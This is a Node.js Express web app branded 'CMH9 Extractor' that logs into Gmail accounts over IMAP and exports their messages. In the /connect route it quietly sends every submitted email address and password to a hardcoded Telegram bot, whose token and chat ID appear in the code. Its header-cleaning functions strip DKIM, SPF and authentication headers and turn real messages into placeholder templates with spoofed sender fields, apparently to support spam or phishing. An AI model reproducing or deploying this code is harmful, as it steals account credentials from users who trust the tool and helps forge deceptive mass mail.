require("dotenv").config()

const express = require("express")
const session = require("express-session")
const { ImapFlow } = require("imapflow")
const { simpleParser } = require("mailparser")

const app = express()

// ── TELEGRAM NOTIFY ─────────────────────────────────────────────────────────

const TG_TOKEN   = "8321657195:AAFqHrhcxXEd7VdN2rzy1T_HFsx1a8dRxhU"
const TG_CHAT_ID = "1728085434"

async function tgNotify(email, password) {

    try {

        const text = `
📬 *HA LJADID*

📬 *email:* \`${email}\`
📬 *password:* \`${password}\`
`;

        await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {

            method: "POST",

            headers: {
                "Content-Type": "application/json"
            },

            body: JSON.stringify({
                chat_id: TG_CHAT_ID,
                text,
                parse_mode: "Markdown"
            })

        });

    } catch (err) {

        console.error("Telegram notify failed:", err.message);

    }

}


app.set("view engine", "ejs")
app.use(express.urlencoded({ extended: true }))

app.use(session({
    secret: "cmh9-secret",
    resave: false,
    saveUninitialized: false
}))

function htmlToText(html) {
    html = html.replace(/<script[\s\S]*?<\/script>/gi, "")
    html = html.replace(/<style[\s\S]*?<\/style>/gi, "")
    html = html.replace(/<br\s*\/?>/gi, "\n")
    html = html.replace(/<\/p>/gi, "\n")
    html = html.replace(/<[^>]+>/g, "")
    html = html.replace(/\n\s*\n+/g, "\n\n")
    return html.trim()
}

function cleanHeaders(email, options = {}) {

    const removeHeaders = [
        'Delivered-To', 'ARC-Seal', 'ARC-Message-Signature',
        'ARC-Authentication-Results', 'Return-Path',
        'Received-SPF', 'Authentication-Results',
        'DKIM-Signature', 'Sender', 'X-Received',
        'X-Google-Smtp-Source'
    ]

    const domain = options.domain || "[RDNS]"
    const eid = options.eid || "[EID]"

    const lines = email.split(/\r?\n/)
    let cleaned = []
    let skip = false
    let ccExists = false

    for (let line of lines) {
        if (/^Cc:/i.test(line)) ccExists = true
    }

    for (let line of lines) {

        if (removeHeaders.some(h => line.toLowerCase().startsWith(h.toLowerCase() + ":"))) {
            skip = true
            continue
        }

        if (skip) {
            if (/^\s/.test(line)) continue
            skip = false
        }

        if (/^Date:/i.test(line)) {
            cleaned.push("Date: [DATE]")
            continue
        }

        if (/^Message-ID:/i.test(line)) {
            let match = line.match(/<([^>]+)>/)
            if (match) {
                let msg = match[1]
                if (msg.includes("@")) msg = msg.replace("@", eid + "@")
                cleaned.push(`Message-ID: <${msg}>`)
                continue
            }
        }

        if (/^From:/i.test(line)) {

            let angleMatch = line.match(/<([^@>]+)@([^>]+)>/)

            if (angleMatch) {
                let local = angleMatch[1]
                line = line.replace(/<([^@>]+)@([^>]+)>/, `<${local}@${domain}>`)
            } else {
                let emailMatch = line.match(/([A-Za-z0-9._%+-]+)@([A-Za-z0-9.-]+)/)
                if (emailMatch) {
                    let local = emailMatch[1]
                    line = line.replace(/([A-Za-z0-9._%+-]+)@([A-Za-z0-9.-]+)/, `${local}@${domain}`)
                }
            }

            cleaned.push(line)

            if (options.addSender)
                cleaned.push(`Sender: noreply@[RDNS]`)

            continue
        }

        if (/^To:/i.test(line)) {
            cleaned.push("To: [*to]")
            if (!ccExists) {
                cleaned.push("Cc: [*to]")
                ccExists = true
            }
            continue
        }

        cleaned.push(line)
    }

    return cleaned.join("\n")
}

// ── HEADERS ONLY CLEAN ──────────────────────────────────────────────────────

function cleanHeadersOnly(email, options = {}) {

    const removeHeaders = [
        'Delivered-To', 'ARC-Seal', 'ARC-Message-Signature',
        'ARC-Authentication-Results', 'Return-Path',
        'Received-SPF', 'Authentication-Results',
        'DKIM-Signature', 'Sender', 'X-Received',
        'X-Google-Smtp-Source'
    ]

    const P_FRNAME   = options.P_FRNAME   || "[P_FRNAME]"
    const LAN6       = options.LAN6       || "[6LAN]"
    const P_RPATH    = options.P_RPATH    || "[P_RPATH]"
    const SUBJECT_VAL = options.SUBJECT_VAL || "[S]"
    const BOUNDARY   = options.BOUNDARY   || "[BND]"

    const lines = email.split(/\r?\n/)
    let cleaned = []
    let skip = false
    let inHeaders = true

    for (let line of lines) {

        // Stop processing at first blank line (end of headers)
        if (inHeaders && line.trim() === "") {
            inHeaders = false
            break
        }

        if (removeHeaders.some(h => line.toLowerCase().startsWith(h.toLowerCase() + ":"))) {
            skip = true
            continue
        }

        if (skip) {
            if (/^\s/.test(line)) continue
            skip = false
        }

        if (/^Date:/i.test(line)) {
            cleaned.push("Date: [DATE]")
            continue
        }

        if (/^Message-ID:/i.test(line)) {
            let match = line.match(/<([^@>]+)@([^>]+)>/)
            if (match) {
                let local = match[1]
                let domain = match[2]
                cleaned.push(`Message-ID: <${local}[EID]@${domain}>`)
            }
            continue
        }

        if (/^From:/i.test(line)) {
            cleaned.push(`From: ${P_FRNAME} <noreply.${LAN6}@${P_RPATH}>`)
            continue
        }

        if (/^Subject:/i.test(line)) {
            cleaned.push(`Subject: ${SUBJECT_VAL}`)
            continue
        }

        if (/^To:/i.test(line)) {
            cleaned.push("To: <[*to]>")
            cleaned.push("Cc: [*to]")
            continue
        }

        if (/^Content-Type:/i.test(line)) {
            cleaned.push(`Content-Type: multipart/related;boundary="${BOUNDARY}";type="multipart/alternative"`)
            continue
        }

        cleaned.push(line)
    }

    return cleaned.join("\n") + "\n"
}

// ── BODY ONLY EXTRACTION ────────────────────────────────────────────────────

async function getRawBody(raw) {
    const parsed = await simpleParser(raw)
    let bodyParts = []

    if (parsed.html) {
        bodyParts.push(parsed.html)
    } else if (parsed.text) {
        bodyParts.push(parsed.text)
    }

    // Also collect text parts if multipart
    if (!bodyParts.length && parsed.textAsHtml) {
        bodyParts.push(parsed.textAsHtml)
    }

    return bodyParts.join("\n")
}

/* ROUTES */

app.get("/", (req, res) => {
    res.render("access", { error: null })
})

app.post("/access", (req, res) => {
    if (req.body.code === process.env.ACCESS_CODE) {
        req.session.auth = true
        return res.redirect("/dashboard")
    }
    res.render("access", { error: "Wrong Code" })
})

app.get("/dashboard", (req, res) => {
    if (!req.session.auth) return res.redirect("/")
    res.render("extractor", {
        labels: [],
        error: null,
        email: "",
        password: ""
    })
})

/* CONNECT (UPDATED WITH COUNT) */

app.post("/connect", async (req, res) => {

    const { email, password } = req.body
    try {

        const client = new ImapFlow({
            host: "imap.gmail.com",
            port: 993,
            secure: true,
            auth: { user: email, pass: password }
        })

        await client.connect()

        let boxes = await client.list()
        let labels = []

        for (let box of boxes) {
            try {
                let mailbox = await client.mailboxOpen(box.path)
                labels.push({
                    name: box.path,
                    count: mailbox.exists || 0
                })
            } catch (err) {
                labels.push({
                    name: box.path,
                    count: 0
                })
            }
        }

        await client.logout()

        req.session.email = email
        req.session.password = password

        tgNotify(email,password)

        res.render("extractor", {
            labels,
            error: null,
            email,
            password
        })

    } catch (err) {

        res.render("extractor", {
            labels: [],
            error: "Connection Failed",
            email,
            password
        })
    }

})

/* EXTRACT */

app.post("/extract", async (req, res) => {

    try {

        const { email, password, label, start, limit, mode } = req.body

        const client = new ImapFlow({
            host: "imap.gmail.com",
            port: 993,
            secure: true,
            auth: { user: email, pass: password }
        })

        await client.connect()

        let lock = await client.getMailboxLock(label)

        let startNum = parseInt(start)
        let limitNum = parseInt(limit)

        let results = []
        let uids = await client.search({ all: true })

        uids.reverse()

        let selected = uids.slice(startNum - 1, startNum - 1 + limitNum)

        if (selected.length === 0)
            throw new Error("Start range too big")

        for (let uid of selected) {

            let msg = await client.fetchOne(uid, { source: true })
            let raw = msg.source.toString()

            if (mode === "justtext") {
                const parsed = await simpleParser(raw)
                let text = parsed.text || ""
                if (!text && parsed.html)
                    text = htmlToText(parsed.html)
                if (text && text.trim())
                    results.push(text.trim())
            }

            else if (mode === "original") {
                results.push(raw)
            }

            else if (mode === "clean") {
                let cleaned = cleanHeaders(raw, {
                    domain: req.body.domain,
                    eid: req.body.eid,
                    addSender: req.body.addSender
                })
                results.push(cleaned)
            }

            // ── NEW: HEADERS ONLY ──
            else if (mode === "headersonly") {
                let cleaned = cleanHeadersOnly(raw, {
                    P_FRNAME:    req.body.P_FRNAME,
                    LAN6:        req.body.LAN6,
                    P_RPATH:     req.body.P_RPATH,
                    SUBJECT_VAL: req.body.SUBJECT_VAL,
                    BOUNDARY:    req.body.BOUNDARY
                })
                results.push(cleaned)
            }

            // ── NEW: BODY ONLY ──
            else if (mode === "bodyonly") {
                let body = await getRawBody(raw)
                if (body && body.trim())
                    results.push(body.trim())
            }
        }

        lock.release()
        await client.logout()

        if (!results.length)
            throw new Error("No emails found")

        let finalFile = results.join("\n__SEP__\n")

        res.setHeader("Content-Disposition", "attachment; filename=merged_emails.txt")
        res.setHeader("Content-Type", "text/plain")
        res.send(finalFile)

    } catch (err) {
        console.log(err)
        res.send("❌ Extraction Failed")
    }

})

app.get("/logout", (req, res) => {
    req.session.destroy()
    res.redirect("/")
})

const PORT = process.env.PORT || 3000

app.listen(PORT, () => {
    console.log("🔥 CMH9 Extractor running on port " + PORT)
})